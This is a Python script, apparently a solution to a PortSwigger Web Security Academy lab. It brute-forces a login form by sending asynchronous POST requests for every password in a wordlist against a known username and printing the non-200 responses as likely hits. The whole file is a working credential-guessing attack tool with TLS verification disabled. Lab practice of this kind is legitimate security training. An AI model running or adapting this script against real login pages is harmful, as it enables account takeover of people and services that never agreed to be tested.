#!/usr/bin/env python3
# Copyright (c) 2025-present, Swadhin
# Requirements:
# requests==2.32.3
# aiohttp==3.11.16

import requests
import urllib3
import asyncio
import aiohttp

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


async def enumerate_password(
    client: aiohttp.ClientSession,
    url="https://YOUR-LAB-ID.web-security-academy.net/login",
    username="your-found-username",
    payload_file="passwords.txt"
):
    """Asynchronously enumerates passwords."""
    payloads = []

    try:
        with open(payload_file, "r+") as f:
            payloads = [line.strip() for line in f]
    except Exception as e:
        print(f"Error - {e}")
        return

    async def check_password(username, password):
        """Asynchronously checks a single password."""
        data = {"username": username, "password": password}
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        try:
            async with client.post(
                url, headers=headers, data=data, allow_redirects=False, ssl=False
            ) as res:
                if res.status != 200:
                    print(username, password, res.status)
        except aiohttp.ClientError as e:
            print(f"Error checking {username}: {e}")

    tasks = [check_password(username, password) for password in payloads]
    await asyncio.gather(*tasks)


async def main():
    """Main asynchronous function."""
    client = requests.session()
    client.verify = False
    client.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

    async with aiohttp.ClientSession(trust_env=True) as client:
        await enumerate_password(
            client,
            url="https://YOUR-LAB-ID.web-security-academy.net/login",
            username="your-found-username",
            payload_file="your-password-file.txt",
        )


if __name__ == "__main__":
    asyncio.run(main())
